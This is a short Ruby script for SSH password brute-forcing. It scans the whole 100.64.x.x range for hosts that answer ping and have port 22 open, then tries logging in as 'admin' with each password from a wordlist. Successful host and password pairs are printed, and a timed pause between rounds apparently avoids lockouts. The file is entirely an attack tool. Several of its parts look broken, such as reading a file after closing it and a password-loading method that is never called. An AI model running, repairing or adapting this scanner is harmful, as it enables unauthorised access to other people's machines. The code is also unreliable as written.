require 'bundler/inline'
require 'date'
require 'timeout'
require 'socket'

gemfile do
  source 'https://rubygems.org'
  gem 'net-ssh'
  gem 'net-ping'
  gem 'debug'
end
LOGIN = 'admin'.freeze
class Scanner
  def initialize(timeout: 2)
    @file_path = './data/passwords.txt'
    @timeout = timeout
    @passwords = []
  end

  def hosts
    @hosts ||= [].tap do |hosts|
      (1..254).each do |i|
        (1..254).each do |j|
          hosts << "100.64.#{i}.#{j}"
        end
      end
    end
  end
  def pingable?(host)
    Timeout.timeout(@timeout) do
      Net::Ping::External.new(host).ping?
    rescue StandardError
      false
    end
  end

  def pingable_hosts
    @pingable_hosts ||= hosts.select { |host| pingable?(host) }
  end

  def connectable?(host, port: 22)
    Timeout.timeout(@timeout) do
      TCPSocket.new(host, port).close
      true
    rescue Errno::ECONNREFUSED, Errno::EHOSTUNREACH
      false
    end
  end

  def connectable_hosts
    @connectable_hosts ||= @pingable_hosts.select { |host| connectable?(host) }
  end

  def fill_passwords
    file = File.new(@file_path, 'r:UTF-8')
    file.close
    @passwords = file.readlines
  end

  def call
    @passwords.each do |pwd| ##################
      start_time = DateTime.now
      connectable_hosts.each do |host|
        Net::SSH.start(host, LOGIN, password: pwd, timeout: @timeout) do |_ssh|
          puts "host: #{host} password: #{pwd}"
        end
      rescue StandardError => e
        puts "err: #{e}"
      end
      diff = ((DateTime.now - start_time) * 24 * 60 * 60).to_i
      sleep(310 - diff) if diff < 310
    end
  end
end